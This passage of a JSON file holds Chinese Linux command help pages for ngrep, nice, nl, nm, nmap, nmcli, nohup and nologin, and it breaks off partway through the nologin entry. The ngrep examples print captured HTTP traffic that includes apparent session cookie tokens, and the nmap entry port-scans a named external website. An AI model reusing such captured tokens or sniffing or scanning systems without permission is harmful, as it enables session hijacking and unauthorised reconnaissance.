将匹配的数据保存到文件</span>\n<span class=\"hljs-literal\">-</span>n <span class=\"hljs-comment\"># 仅捕获指定数目的数据包进行查看</span>\n<span class=\"hljs-literal\">-</span>A <span class=\"hljs-comment\"># 匹配到数据包后dump随后的指定数目的数据包</span>\n<span class=\"hljs-literal\">-</span>s <span class=\"hljs-comment\"># set the bpf caplen</span>\n<span class=\"hljs-literal\">-</span>S <span class=\"hljs-comment\"># set the limitlen on matched packets</span>\n<span class=\"hljs-literal\">-</span>W <span class=\"hljs-comment\"># 设置显示格式byline将解析包中的换行符</span>\n<span class=\"hljs-literal\">-</span>c <span class=\"hljs-comment\"># 强制显示列的宽度</span>\n<span class=\"hljs-literal\">-</span>P <span class=\"hljs-comment\"># set the non-printable display char to what is specified</span>\n<span class=\"hljs-literal\">-</span>F <span class=\"hljs-comment\"># 使用文件中定义的bpf(Berkeley Packet Filter)</span>\n<span class=\"hljs-literal\">-</span>N <span class=\"hljs-comment\"># 显示由IANA定义的子协议号</span>\n<span class=\"hljs-literal\">-</span>d <span class=\"hljs-comment\"># 使用哪个网卡，可以用-L选项查询</span>\n<span class=\"hljs-literal\">-</span>L <span class=\"hljs-comment\"># 查询网卡接口</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>捕捉cloudian：18080端口的request和response，<code>-W byline</code>用来解析包中的换行符，否则包里的所有数据都是连续的，可读性差。<code>-d lo</code>是监听本地网卡：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ngrep</span> -W byline -d lo port <span class=\"hljs-number\">18080</span>\n</code></pre>\n<p>捕捉amazon：80端口的request和response。<code>-d eth0是</code>用来监听对外的网卡：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ngrep</span> -W byline -d eth0 port <span class=\"hljs-number\">80</span>\n</code></pre>\n<p>可以用<code>-d any</code>来捕捉所有的包：</p>\n<pre><code class=\"language-shell\">ngrep <span class=\"hljs-string\">'[a-zA-Z]'</span> -t -W byline -d <span class=\"hljs-keyword\">any</span> tcp port <span class=\"hljs-number\">18080</span>\n</code></pre>\n<p>捕获字符串<code>.flv</code>，比如要查看在Web Flash 视频中的.flv文件的下载地址：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ngrep</span> -d3 -N -q \\.flv\n<span class=\"hljs-attribute\">interface</span>: \\Device\\TNT_40_1_{<span class=\"hljs-number\">670</span>F6B50-<span class=\"hljs-number\">0</span>A13-<span class=\"hljs-number\">4</span>BAB-<span class=\"hljs-number\">9</span>D9E-<span class=\"hljs-number\">994</span>A833F5BA9} (<span class=\"hljs-number\">10.132.0.0</span>/<span class=\"hljs-number\">2</span>\n<span class=\"hljs-attribute\">55</span>.<span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">0</span>)\n<span class=\"hljs-attribute\">match</span>: \\.flv\n</code></pre>\n<p>打开一个视频页面：</p>\n<pre><code class=\"language-shell\">T(<span class=\"hljs-number\">6</span>) <span class=\"hljs-number\">10.132.34.23</span>:<span class=\"hljs-number\">24860</span> -&gt; <span class=\"hljs-number\">61.142.208.154</span>:<span class=\"hljs-number\">80</span> [AP]\nGET /f59.c31.<span class=\"hljs-number\">56</span>.com/flvdownload/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">19</span>/ggyg7741@<span class=\"hljs-number\">56</span>.com_56flv_zhajm_<span class=\"hljs-number\">119556973</span>\n<span class=\"hljs-number\">97</span>.flv HTTP/<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>..accept: */*..Referer: http://www.<span class=\"hljs-number\">56</span>.com/flashApp/v_player_\nsite.swf..x-flash-version: <span class=\"hljs-number\">9,0,45,0</span>..UA-CPU: x86..Accept-Encoding: gzip, de\nflate..User-Agent: Mozilla/<span class=\"hljs-number\">4</span>.<span class=\"hljs-number\">0</span> (compatible<span class=\"hljs-comment\">; MSIE 7.0; Windows NT 5.1; .NET</span>\nCLR <span class=\"hljs-number\">2.0.50727</span><span class=\"hljs-comment\">; .NET CLR 3.0.04506.30)..host: f59.r.56.com..Connection: Keep</span>\n-Alive..Cookie: whistoryview=<span class=\"hljs-number\">23423759</span>-<span class=\"hljs-number\">23635627</span>-<span class=\"hljs-number\">23423344</span>-<span class=\"hljs-number\">23171935</span>-<span class=\"hljs-number\">23058374-2</span>\n<span class=\"hljs-number\">3081156</span>-<span class=\"hljs-number\">23207350</span>-<span class=\"hljs-number\">22395727</span>-<span class=\"hljs-comment\">; geoip=............; wl_all_s=y....</span>\n</code></pre>\n<p>OK。地址已经找到了,就是<a href=\"http://f59.c31.56.com/flvdownload/12/19/ggyg7741@56.com_56flv_zhajm_11955697397.flv\">http://f59.c31.56.com/flvdownload/12/19/ggyg7741@56.com_56flv_zhajm_11955697397.flv</a></p>\n<p>加个<code>-W byline</code>参数后,将解析包中的换行符：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">T</span>(<span class=\"hljs-number\">6</span>) <span class=\"hljs-number\">2007</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">56</span>:<span class=\"hljs-number\">12</span>.<span class=\"hljs-number\">192619</span> <span class=\"hljs-number\">10.132.34.23:26365</span> -&gt; <span class=\"hljs-number\">59.151.21.101:80</span><span class=\"hljs-meta\"> [AP]</span>\n<span class=\"hljs-attribute\">GET</span> /aa.flv HTTP/<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>.\n<span class=\"hljs-attribute\">Accept</span>: */*.\n<span class=\"hljs-attribute\">Accept</span>-Language: zh-cn.\n<span class=\"hljs-attribute\">UA</span>-CPU: x86.\n<span class=\"hljs-attribute\">Accept</span>-Encoding: gzip, deflate.\n<span class=\"hljs-attribute\">User</span>-Agent: Mozilla/<span class=\"hljs-number\">4</span>.<span class=\"hljs-number\">0</span> (compatible; MSIE <span class=\"hljs-number\">7</span>.<span class=\"hljs-number\">0</span>; Windows NT <span class=\"hljs-number\">5</span>.<span class=\"hljs-number\">1</span>; .NET CLR <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">5072</span>\n<span class=\"hljs-attribute\">7</span>; .NET CLR <span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">04506</span>.<span class=\"hljs-number\">30</span>).\n<span class=\"hljs-attribute\">Host</span>: www.google.cn.\n<span class=\"hljs-attribute\">Connection</span>: Keep-Alive.\n<span class=\"hljs-attribute\">Cookie</span>: PREF=id=a0b2932c336477e9:TB=<span class=\"hljs-number\">4</span>:NW=<span class=\"hljs-number\">1</span>:TM=<span class=\"hljs-number\">1187877372</span>:LM=<span class=\"hljs-number\">1187956074</span>:S=Y1Fzndp\n<span class=\"hljs-attribute\">rT3vFo7ac</span>; SID=DQAAAHcAAABJCEXeOVLHu2rIfb5BfKP3GG9PbhJDEkXsLTV8y0f_lvSd2Y46Q0FPt\n<span class=\"hljs-attribute\">83CnEs9rxA1xBDM9mLR8</span>-ckWeScyOQA8PyYnX5u5OjFvjfRbDg_FDZfwxhRzqS9KPZv26pjnsUxs0FDM\n<span class=\"hljs-attribute\">1xpJ5AgDn38pXtlCdkksJ0</span>-cbiIWoA61oHWMg; NID=<span class=\"hljs-number\">7</span>=AvJxn5B6YOLLxoYz4LLzhIbNsQUQiulRS6U\n<span class=\"hljs-attribute\">JGxdBniQBmXm99y7L</span>-NBNORN82N3unmZSGHFPfePVHnLK2MjYjglyXZhU9x7ETXNBnY3NurNijHDhJ7K\n<span class=\"hljs-attribute\">yi7E53UBOcv4V</span>.\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "nice",
        "des": "改变程序执行的优先权等级",
        "body": "<h1 id=\"nice\">nice</h1>\n<p>改变程序执行的优先权等级</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nice命令</strong> 用于以指定的进程调度优先级启动其他的程序。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">nice</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n：指定进程的优先级（整数）。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>指令及选项：需要运行的指令及其他选项。</p>\n<h3 id=\"实例\">实例</h3>\n<p>新建一个进程并设置优先级，将当前目录下的documents目录打包，但不希望tar占用太多CPU：</p>\n<pre><code class=\"language-shell\">nice -<span class=\"hljs-number\">19</span> tar zcf pack<span class=\"hljs-selector-class\">.tar</span><span class=\"hljs-selector-class\">.gz</span> documents\n</code></pre>\n<p>方法非常简单，即在原命令前加上<code>nice -19</code>。很多人可能有疑问了，最低优先级不是19么？那是因为这个“-19”中的“-”仅表示参数前缀；所以，如果希望将当前目录下的documents目录打包，并且赋予tar进程最高的优先级：</p>\n<pre><code class=\"language-shell\">nice --<span class=\"hljs-number\">19</span> tar zcf pack<span class=\"hljs-selector-class\">.tar</span><span class=\"hljs-selector-class\">.gz</span> documents\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "nisdomainname",
        "des": "显示主机NIS的域名",
        "body": "<h1 id=\"nisdomainname\">nisdomainname</h1>\n<p>显示主机NIS的域名</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nisdomainname命令</strong> 用于显示主机NIS的域名。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">nisdomainname</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v：详细信息模式。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "nl",
        "des": "为每一个文件添加行号。",
        "body": "<h1 id=\"nl\">nl</h1>\n<p>为每一个文件添加行号。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">nl [<span class=\"hljs-symbol\">OPTION</span>]... [<span class=\"hljs-symbol\">FILE</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>将每一个输入的文件添加行号后发送到标准输出。</li>\n<li>当没有文件或文件为<code>-</code>时，读取标准输入</li>\n<li>处理逻辑页（logical page）。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">-b, <span class=\"hljs-attribute\">--body-numbering</span>=STYLE           使用STYLE 为body部分的行附加行号。\n-d, <span class=\"hljs-attribute\">--section-delimiter</span>=CC           使用CC作为logical page的分隔符。\n-f, <span class=\"hljs-attribute\">--footer-numbering</span>=STYLE         使用STYLE 为footer部分的行附加行号。\n-h, <span class=\"hljs-attribute\">--header-numbering</span>=STYLE         使用STYLE 为header部分的行附加行号。\n-i, <span class=\"hljs-attribute\">--line-increment</span>=NUMBER          行号递增间隔为NUMBER。\n-l, <span class=\"hljs-attribute\">--join-blank-lines</span>=NUMBER        连续NUMBER行的空行作为一行处理。\n-n, <span class=\"hljs-attribute\">--number-format</span>=FORMAT           根据FORMAT插入行号。\n-p, --no-renumber                    不要在每个部分重置行号。\n-s, <span class=\"hljs-attribute\">--number-separator</span>=STRING        在行号后添加字符串STRING。\n-v, <span class=\"hljs-attribute\">--starting-line-number</span>=NUMBER    每部分的起始行号。\n-w, <span class=\"hljs-attribute\">--number-width</span>=NUMBER            行号宽度为NUMBER。\n--help                               显示帮助信息并退出。\n--version                            显示版本信息并退出。\n\n\n默认选项为：-bt -d<span class=\"hljs-string\">'\\:'</span> -fn -hn -i1 -l1 -nrn -sTAB -v1 -w6\n\nCC是由两个字符组成的，默认为\\: ,第二个字符如果缺失则默认为:\n\nSTYLE可以为下列可用值之一：\n\na       所有行标记行号。\nt       仅为非空行标记行号。\nn       不标记行号。\npBRE    符合基础正则表达式（BRE）的行会标记行号。\n\nFORMAT可以为下列可用值之一：\n\nln    左对齐，不会在开始部分补充0以满足宽度。\nrn    右对齐，不会在开始部分补充0以满足宽度。\nrz    右对齐，会在开始部分补充0以满足宽度。\n\nlogical<span class=\"hljs-built_in\"> page\n</span>三部分组成（header， body， footer）\n起始标记（header \\:\\:\\:， body \\:\\:， footer \\:）\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>FILE（可选）：要处理的文件，可以为一或多个。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">nl_logicalpage.txt：该文件用于说明nl命令处理逻辑页，内容如下：\n<span class=\"hljs-string\">\\:\\:\\:</span>\nheader_1\n<span class=\"hljs-string\">\\:\\:</span>\nbody_1\n<span class=\"hljs-string\">\\:</span>\nfooter_1\n<span class=\"hljs-string\">\\:\\:\\:</span>\nheader_2\n<span class=\"hljs-string\">\\:\\:</span>\nbody_2\n<span class=\"hljs-string\">\\:</span>\nfooter_2\n</code></pre>\n<pre><code class=\"language-shell\">[user2@pc ~]$ nl nl<span class=\"hljs-emphasis\">_logicalpage.txt\n\n       header_</span>1\n\n<span class=\"hljs-code\">     1    body_1\n</span>\n<span class=\"hljs-code\">       footer_1\n</span>\n<span class=\"hljs-code\">       header_2\n</span>\n<span class=\"hljs-code\">     1    body_2\n</span>\n<span class=\"hljs-code\">       footer_2\n</span>\n[user2@pc ~]$ nl -v0 -fa -ha nl<span class=\"hljs-emphasis\">_logicalpage.txt\n\n     0    header_</span>1\n\n<span class=\"hljs-code\">     1    body_1\n</span>\n<span class=\"hljs-code\">     2    footer_1\n</span>\n<span class=\"hljs-code\">     0    header_2\n</span>\n<span class=\"hljs-code\">     1    body_2\n</span>\n<span class=\"hljs-code\">     2    footer_2\n</span>\n[user2@pc ~]$ nl -p -fa -ha nl<span class=\"hljs-emphasis\">_logicalpage.txt\n\n     1    header_</span>1\n\n<span class=\"hljs-code\">     2    body_1\n</span>\n<span class=\"hljs-code\">     3    footer_1\n</span>\n<span class=\"hljs-code\">     4    header_2\n</span>\n<span class=\"hljs-code\">     5    body_2\n</span>\n<span class=\"hljs-code\">     6    footer_2</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nl_normal</span>.txt：该文件用于说明nl命令处理普通文件，内容如下：\n<span class=\"hljs-attribute\">ZhuangZhu</span>-<span class=\"hljs-number\">74</span>\n<span class=\"hljs-attribute\">2019</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">21</span>\n<span class=\"hljs-attribute\">127</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">1</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[user2@pc ~]</span>$ nl nl_normal<span class=\"hljs-selector-class\">.txt</span>\n     <span class=\"hljs-number\">1</span>    ZhuangZhu-<span class=\"hljs-number\">74</span>\n     <span class=\"hljs-number\">2</span>    <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">21</span>\n     <span class=\"hljs-number\">3</span>    <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>\n\n<span class=\"hljs-selector-attr\">[user2@pc ~]</span>$ nl -<span class=\"hljs-selector-tag\">b</span> p<span class=\"hljs-string\">'1$'</span> nl_normal<span class=\"hljs-selector-class\">.txt</span>\n       ZhuangZhu-<span class=\"hljs-number\">74</span>\n     <span class=\"hljs-number\">1</span>    <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">21</span>\n     <span class=\"hljs-number\">2</span>    <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>\n\n<span class=\"hljs-selector-attr\">[user2@pc ~]</span>$ nl -<span class=\"hljs-selector-tag\">b</span> p<span class=\"hljs-string\">'^[A-Z]'</span> nl_normal<span class=\"hljs-selector-class\">.txt</span>\n     <span class=\"hljs-number\">1</span>    ZhuangZhu-<span class=\"hljs-number\">74</span>\n       <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">21</span>\n       <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 nl</code>，<code>info coreutils 'nl invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "nm",
        "des": "显示二进制目标文件的符号表",
        "body": "<h1 id=\"nm\">nm</h1>\n<p>显示二进制目标文件的符号表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nm命令</strong> 被用于显示二进制目标文件的符号表。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">nm</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-A：每个符号前显示文件名；</span>\n<span class=\"hljs-deletion\">-D：显示动态符号；</span>\n<span class=\"hljs-deletion\">-g：仅显示外部符号；</span>\n<span class=\"hljs-deletion\">-r：反序显示符号表。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目标文件：二进制目标文件，通常是库文件和可执行文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "nmap",
        "des": "网络探测和安全审核",
        "body": "<h1 id=\"nmap\">nmap</h1>\n<p>网络探测和安全审核</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nmap命令</strong> 是一款开放源代码的网络探测和安全审核工具，它的设计目标是快速地扫描大型网络。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">nmap</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-O：激活操作探测；</span>\n<span class=\"hljs-deletion\">-P0：值进行扫描，不ping主机；</span>\n<span class=\"hljs-deletion\">-PT：是同TCP的ping；</span>\n<span class=\"hljs-deletion\">-sV：探测服务版本信息；</span>\n<span class=\"hljs-deletion\">-sP：ping扫描，仅发现目标主机是否存活；</span>\n<span class=\"hljs-deletion\">-ps：发送同步（SYN）报文；</span>\n<span class=\"hljs-deletion\">-PU：发送udp ping；</span>\n<span class=\"hljs-deletion\">-PE：强制执行直接的ICMPping；</span>\n<span class=\"hljs-deletion\">-PB：默认模式，可以使用ICMPping和TCPping；</span>\n<span class=\"hljs-deletion\">-6：使用IPv6地址；</span>\n<span class=\"hljs-deletion\">-v：得到更多选项信息；</span>\n<span class=\"hljs-deletion\">-d：增加调试信息地输出；</span>\n<span class=\"hljs-deletion\">-oN：以人们可阅读的格式输出；</span>\n<span class=\"hljs-deletion\">-oX：以xml格式向指定文件输出信息；</span>\n<span class=\"hljs-deletion\">-oM：以机器可阅读的格式输出；</span>\n<span class=\"hljs-deletion\">-A：使用所有高级扫描选项；</span>\n<span class=\"hljs-deletion\">--resume：继续上次执行完的扫描；</span>\n<span class=\"hljs-deletion\">-P：指定要扫描的端口，可以是一个单独的端口，用逗号隔开多个端口，使用“-”表示端口范围；</span>\n<span class=\"hljs-deletion\">-e：在多网络接口Linux系统中，指定扫描使用的网络接口；</span>\n<span class=\"hljs-deletion\">-g：将指定的端口作为源端口进行扫描；</span>\n<span class=\"hljs-deletion\">--ttl：指定发送的扫描报文的生存期；</span>\n<span class=\"hljs-deletion\">--packet-trace：显示扫描过程中收发报文统计；</span>\n<span class=\"hljs-deletion\">--scanflags：设置在扫描报文中的TCP标志。</span>\n<span class=\"hljs-deletion\">--send-eth/--send-ip 使用原始以太网发送/构造指定IP发送</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>ip地址：指定待扫描报文中的TCP地址。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>安装nmap</strong> </p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span> nmap\n</code></pre>\n<p> <strong>使用nmap扫描<a href=\"http://www.jsdig.com%E7%9A%84%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3\">www.jsdig.com的开放端口</a></strong> </p>\n<pre><code class=\"language-shell\">[root@localhost ~]# <span class=\"hljs-keyword\">nmap</span> www.jsdig.<span class=\"hljs-keyword\">com</span>\n\nStarting Nmap <span class=\"hljs-number\">4.11</span> ( http://www.insecure.org/<span class=\"hljs-keyword\">nmap</span>/ ) at <span class=\"hljs-number\">2013</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">28</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">06</span> CST\nInteresting ports <span class=\"hljs-keyword\">on</span> <span class=\"hljs-number\">100</span>-<span class=\"hljs-number\">42</span>-<span class=\"hljs-number\">212</span>-<span class=\"hljs-number\">8</span>.static.webnx.<span class=\"hljs-keyword\">com</span> (<span class=\"hljs-number\">100.42</span>.<span class=\"hljs-number\">212.8</span>):\nNot shown: <span class=\"hljs-number\">1678</span> filtered ports\nPORT   STATE service\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-keyword\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-keyword\">open</span>  http\n\nNmap finished: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host <span class=\"hljs-keyword\">up</span>) scanned in <span class=\"hljs-number\">45.870</span> seconds\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "nmcli",
        "des": "地址配置工具",
        "body": "<h1 id=\"nmcli\">nmcli</h1>\n<p>地址配置工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nmcli命令</strong> 是 NetworkManager client 网络管理客户端。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-tag\">nmcli</span> <span class=\"hljs-selector-attr\">[OPTIONS]</span> <span class=\"hljs-selector-tag\">OBJECT</span> { <span class=\"hljs-selector-tag\">COMMAND</span> | <span class=\"hljs-selector-tag\">help</span> }\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">OPTIONS\n  -t<span class=\"hljs-comment\">[erse]</span>                                  # terse output 简洁的输出\n  -p<span class=\"hljs-comment\">[retty]</span>                                 # pretty output 漂亮的输出\n  -m<span class=\"hljs-comment\">[ode]</span> tabular|multiline                 # output mode  输出模式\n  -f<span class=\"hljs-comment\">[ields]</span> &lt;field1,field2,...&gt;|all|common  # specify fields to output 指定要输出的字段\n  -e<span class=\"hljs-comment\">[scape]</span> yes|no                          # escape columns separators in values 在值中转义列分隔符\n  -n<span class=\"hljs-comment\">[ocheck]</span>                                # 不要检查nmcli和NetworkManager版本\n  -a<span class=\"hljs-comment\">[sk]</span>                                    # 要求缺少参数\n  -w<span class=\"hljs-comment\">[ait]</span> &lt;seconds&gt;                         # 设置超时等待整理操作\n  -v<span class=\"hljs-comment\">[ersion]</span>                                # 显示程序版本\n  -h<span class=\"hljs-comment\">[elp]</span>                                   # 打印此帮助\n\nOBJECT\n  g<span class=\"hljs-comment\">[eneral]</span>       NetworkManager的一般状态和操作\n  n<span class=\"hljs-comment\">[etworking]</span>    整体组网控制\n  r<span class=\"hljs-comment\">[adio]</span>         NetworkManager切换开关\n  c<span class=\"hljs-comment\">[onnection]</span>    NetworkManager的连接\n  d<span class=\"hljs-comment\">[evice]</span>        由NetworkManager管理的设备\n  a<span class=\"hljs-comment\">[gent]</span>         NetworkManager秘密代理或polkit代理\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">nmcli connection <span class=\"hljs-keyword\">show</span>           <span class=\"hljs-meta\"># 查看当前连接状态</span>\nnmcli connection reload         <span class=\"hljs-meta\"># 重启服务</span>\nnmcli connection <span class=\"hljs-keyword\">show</span> -active   <span class=\"hljs-meta\"># 显示活动的连接</span>\nnmcli connection <span class=\"hljs-keyword\">show</span> <span class=\"hljs-string\">\"lan eth0\"</span><span class=\"hljs-meta\"># 显示指定一个网络连接配置</span>\nnmcli device status             <span class=\"hljs-meta\"># 显示设备状态</span>\nnmcli device <span class=\"hljs-keyword\">show</span> eno16777736   <span class=\"hljs-meta\"># 显示指定接口属性</span>\nnmcli device <span class=\"hljs-keyword\">show</span>               <span class=\"hljs-meta\"># 显示全部接口属性</span>\nnmcli <span class=\"hljs-built_in\">con</span> up static             <span class=\"hljs-meta\"># 启用static连接配置</span>\nnmcli <span class=\"hljs-built_in\">con</span> up default            <span class=\"hljs-meta\"># 启用default连接配置 </span>\nnmcli <span class=\"hljs-built_in\">con</span> add help              <span class=\"hljs-meta\"># 查看帮助</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "nohup",
        "des": "将程序以忽略挂起信号的方式运行起来",
        "body": "<h1 id=\"nohup\">nohup</h1>\n<p>将程序以忽略挂起信号的方式运行起来</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nohup命令</strong> 可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端。</p>\n<p>无论是否将 nohup 命令的输出重定向到终端，输出都将附加到当前目录的 nohup.out 文件中。如果当前目录的 nohup.out 文件不可写，输出重定向到<code>$HOME/nohup.out</code>文件中。如果没有文件能创建或打开以用于追加，那么 command 参数指定的命令不可调用。如果标准错误是一个终端，那么把指定的命令写给标准错误的所有输出作为标准输出重定向到相同的文件描述符。</p>\n<h3 id=\"语法\">语法</h3>\n<p>nohup(选项)(参数)</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help：在线帮助；</span>\n<span class=\"hljs-comment\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>程序及选项：要运行的程序及选项。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用nohup命令提交作业，如果使用nohup命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为nohup.out的文件中，除非另外指定了输出文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nohup</span> command &gt; myout.file <span class=\"hljs-number\">2</span>&gt;&amp;<span class=\"hljs-number\">1</span> &amp;\n</code></pre>\n<p>在上面的例子中，输出被重定向到myout.file文件中。</p>\n<p>该指令表示不做挂断操作，后台下载</p>\n<pre><code class=\"language-shell\">nohup wget site.com/<span class=\"hljs-keyword\">file</span>.<span class=\"hljs-keyword\">zip</span>\n</code></pre>\n<p>下面命令，会在同一个目录下生成一个名称为 <code>nohup.out</code> 的文件，其中包含了正在运行的程序的输出内容</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nohup</span> ping -c <span class=\"hljs-number\">10</span> baidu.com\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "nologin",
        "des": "拒绝用户登录系统",
        "body": "<h1 id=\"nologin\">nologin</h1>\n<p>拒绝用户登录系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nologin命令</strong> 可以实现礼貌地拒绝用户登录系统，同时给出信息。如果尝试以这类用户登录，就在log里添加记录，然后在终端输出This account is currently not available信息，就是这样。一般设置这样的帐号是给启动服务的账号所用的，这只是让服务启动起来，但是不能登录系统。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nologin</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>Linux禁止用户登录：</p>\n<p>禁止用户登录后，用户不能登录系统，但可以登录ftp、SAMBA等。我们在Linux下做系统维护的时候，希望个别用户或者所有用户不能登录系统，保证系统在维护期间正常运行。这个时候我们就要禁止用户登录。&nbsp;&nbsp;</p>\n<p>1、禁止个别用户登录，比如禁止lynn用户登录。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">passwd -l lynn</span>\n</code></pre>\n<p>这就话的意思是锁定lynn用户，这样该用户就不能登录了。&nbsp;&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">passwd -u lynn</span>\n</code></pre>\n<p>上面是对锁定的用户lynn进行解锁，用户可登录了。&nbsp;&nbsp;&nbsp;&nbsp;</p>\n<p>2、我们通过修改<code>/etc/passwd</code>文件中用户登录的shell</p>\n<pre><code class=\"language-shell\">vi <span class=\"hljs-regexp\">/etc/</span>passwd\n</code></pre>\n<p>更改为：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">lynn:</span><span class=\"hljs-symbol\">x:</span><span class=\"hljs-number\">500</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">500</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-symbol\">:/home/lynn</span><span class=\"hljs-symbol\">:/sbin/nologin</span>\n</code></pre>\n<p>该用户就无法登录了。&nbsp;&nbsp;</p>\n<p>3、禁止所有用户登录。</p>\n<pre><code class=\"language-shell\">touch <span 